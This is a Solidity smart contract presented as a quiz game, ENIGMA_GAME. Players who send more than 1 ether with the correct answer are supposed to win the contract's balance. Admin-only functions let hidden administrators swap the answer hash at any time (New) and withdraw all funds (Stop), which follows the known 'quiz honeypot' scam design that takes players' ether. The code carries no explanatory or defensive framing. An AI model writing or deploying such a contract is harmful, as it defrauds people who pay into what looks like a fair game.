1 pragma solidity ^0.4.25;
2 
3 contract ENIGMA_GAME
4 {
5     function Try(string _response) external payable 
6     {
7         require(msg.sender == tx.origin);
8 
9         if(responseHash == keccak256(_response) && msg.value > 1 ether)
10         {
11             msg.sender.transfer(this.balance);
12         }
13     }
14 
15     string public question;
16 
17     bytes32 responseHash;
18 
19     mapping (bytes32=>bool) admin;
20 
21     function Start(string _question, string _response) public payable isAdmin{
22         if(responseHash==0x0){
23             responseHash = keccak256(_response);
24             question = _question;
25         }
26     }
27 
28     function Stop() public payable isAdmin {
29         msg.sender.transfer(this.balance);
30     }
31 
32     function New(string _question, bytes32 _responseHash) public payable isAdmin {
33         question = _question;
34         responseHash = _responseHash;
35     }
36 
37     constructor(bytes32[] admins) public{
38         for(uint256 i=0; i< admins.length; i++){
39             admin[admins[i]] = true;        
40         }       
41     }
42 
43     modifier isAdmin(){
44         require(admin[keccak256(msg.sender)]);
45         _;
46     }
47 
48     function() public payable{}
49 }